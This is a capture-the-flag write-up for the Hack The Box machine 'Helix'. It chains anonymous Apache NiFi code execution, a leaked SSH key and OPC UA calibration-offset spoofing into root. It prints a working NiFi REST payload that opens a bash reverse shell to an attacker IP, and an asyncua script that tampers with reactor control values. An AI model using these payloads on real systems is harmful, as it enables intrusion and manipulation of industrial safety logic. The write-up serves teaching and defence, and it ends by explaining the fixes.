# Helix — Hack The Box, Medium, Linux

**TL;DR:** Two ports, and the web root 302-redirects to `helix.htb`; a vhost sweep
finds `flow.helix.htb` running **Apache NiFi 1.21.0** with anonymous access that
includes the restricted **`execute-code`** policy. That is unauthenticated RCE:
POST an `ExecuteProcess` processor over the REST API and catch a shell as `nifi`.
The NiFi install ships a support bundle containing `operator`'s backup SSH private
key — `ssh -i` straight to the user flag. Root is an **OT integrity attack**:
`operator` may `sudo` a maintenance console that only drops a root shell while a
"maintenance window" is open, and that window is opened by a **root safety
controller** reacting to a reactor temperature it reads over an **unauthenticated
OPC UA server**. Because the safety logic trusts `Temperature = TemperatureRaw +
CalibrationOffset` and `CalibrationOffset` is anonymously writable, you fabricate a
hazardous reading with a benign raw sensor, the window opens, and `sudo
helix-maint-console` gives root.

## 1. Recon

```
22/tcp  OpenSSH 8.9p1 Ubuntu
80/tcp  nginx 1.18.0 (Ubuntu)
```

Full 65535-port TCP sweep and UDP top-100 confirm nothing else. `/` on the IP
302-redirects to `http://helix.htb/`, so it is vhost-gated — add the host. `helix.htb`
is a static "Helix Industries" (industrial automation) brochure. Fuzz `Host:`:

```bash
ffuf -u http://10.129.x.x/ -H 'Host: FUZZ.helix.htb' \
     -w subdomains-top1million-20000.txt -fs 154
# → flow   (200)
```

`flow.helix.htb` is **Apache NiFi**.

## 2. Foothold — NiFi anonymous `execute-code`

NiFi tells you everything over its unauthenticated API:

```
GET /nifi-api/flow/about        → "version":"1.21.0"
GET /nifi-api/access/config     → {"config":{"supportsLogin":false}}
GET /nifi-api/flow/current-user → identity "anonymous", canWrite:true on every
                                  policy — including the restricted "execute-code"
```

`supportsLogin:false` + anonymous write on `execute-code` means any client can add
and run a processor. Create an `ExecuteProcess` on the root process group, point it
at a reverse shell, and start it:

```
POST /nifi-api/process-groups/<root-id>/processors
{
  "revision":{"version":0},
  "component":{
    "type":"org.apache.nifi.processors.standard.ExecuteProcess",
    "config":{"properties":{
      "Command":"/bin/bash",
      "Command Arguments":"-c;bash -i >& /dev/tcp/10.10.14.x/4444 0>&1",
      "Argument Delimiter":";"
    },"autoTerminatedRelationships":["success"]}
  }
}
PUT /nifi-api/processors/<id>/run-status  {"revision":{...},"state":"RUNNING"}
```

Shell as `nifi`. (Clean up after: stop and `DELETE` the processor.)

## 3. `nifi` → `operator`

`nifi` cannot read `/home/operator`, but the NiFi install directory carries an
operator support artifact readable by the service account:

```
/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak   ← OpenSSH private key
```

```bash
ssh -i operator_id_ed25519 operator@10.129.x.x
operator@helix:~$ cat user.txt      # <user flag redacted>
```

> Rabbit hole worth naming: the DBCP `operator` password is recoverable too —
> decrypt the `enc{…}` in `conf/flow.xml.gz` with NiFi's own `PropertyEncryptorBuilder`
> (algorithm `NIFI_PBKDF2_AES_GCM_256`) using `nifi.sensitive.props.key` from
> `conf/nifi.properties`. The KDF salt is the fixed string `"NiFi Static Salt"`, so
> reimplementing PBKDF2 offline and guessing the salt fails — run NiFi's classes with
> the on-box JDK instead. It decrypts to the H2 pool password, **not** the OS account.

## 4. `operator` → root: spoofing the safety system

```
operator@helix:~$ sudo -l
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

The console is a short script: if `/opt/helix/state/maintenance_window` exists and
holds a **future epoch**, it launches `/bin/bash -p` as root via `systemd-run`;
otherwise it prints `Maintenance window CLOSED` and exits. So the task is to open
that window.

Three local services model a reactor (`ss -ltnp`):

- `helix-plc` (user `plc`) — **OPC UA** server, `127.0.0.1:4840`.
- `helix-safety` (**root**) — opens the maintenance window on a hazardous condition.
- `helix-hmi` (`www-data`) — Flask dashboard, `127.0.0.1:8081`.

The HMI source gives the model away:

```python
Temperature (effective) = TemperatureRaw + CalibrationOffset   # trip at 305, hazard >= 295
```

Tunnel `4840` back and browse it with `asyncua`. The server allows anonymous read
**and write**; the `urn:helix:ot` namespace (`ns=2`) holds:

```
Reactor/TemperatureRaw     read-only
Reactor/Temperature        read-only   (= Raw + Offset)
Reactor/CalibrationOffset  WRITABLE      ← the lever
Control/Mode               WRITABLE
Control/TestOverride       WRITABLE
```

You cannot write the sensor, but you can write the calibration offset, and the
safety controller trusts the calibrated value. Put the plant into a maintenance test
state and bias the offset until effective temperature crosses the hazard band while
the raw sensor stays benign (below trip):

```python
from asyncua import Client, ua
async with Client("opc.tcp://127.0.0.1:4840/helix/") as c:
    async def w(nid, v, t):
        await c.get_node(nid).write_value(ua.DataValue(ua.Variant(v, t)))
    await w("ns=2;i=12", "MAINTENANCE", ua.VariantType.String)   # Mode
    await w("ns=2;i=13", True,          ua.VariantType.Boolean)  # TestOverride
    await w("ns=2;i=6",  14.0,          ua.VariantType.Double)   # CalibrationOffset: 284→~298
```

The root safety controller now writes `now+120` into
`/opt/helix/state/maintenance_window`. While it is valid:

```
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 116 seconds
root@helix:~# cat /root/root.txt      # <root flag redacted>
```

## 5. Why it works

The root safety controller makes a privileged decision from data an unauthenticated
attacker fully controls: an OPC UA server with no signing/auth, and a "temperature"
that is really `raw_sensor + attacker-writable_offset`. Two fixes each break the
chain — authenticate/sign OPC UA and evaluate the *raw* sensor in safety logic, and
never derive a root shell from OT state. Upstream of all of it, the NiFi anonymous
`execute-code` is the front door: fix that and the box is never reachable remotely.

## Leads that didn't pan out
- Command-injection / SSTI via the OPC `Mode` string — reflected verbatim by the HMI, no execution.
- Decrypting all 16 archived NiFi `enc{}` values — every one was the same H2 password.
- The HMI exposes no privileged endpoint, and nginx never proxies `8081` externally.
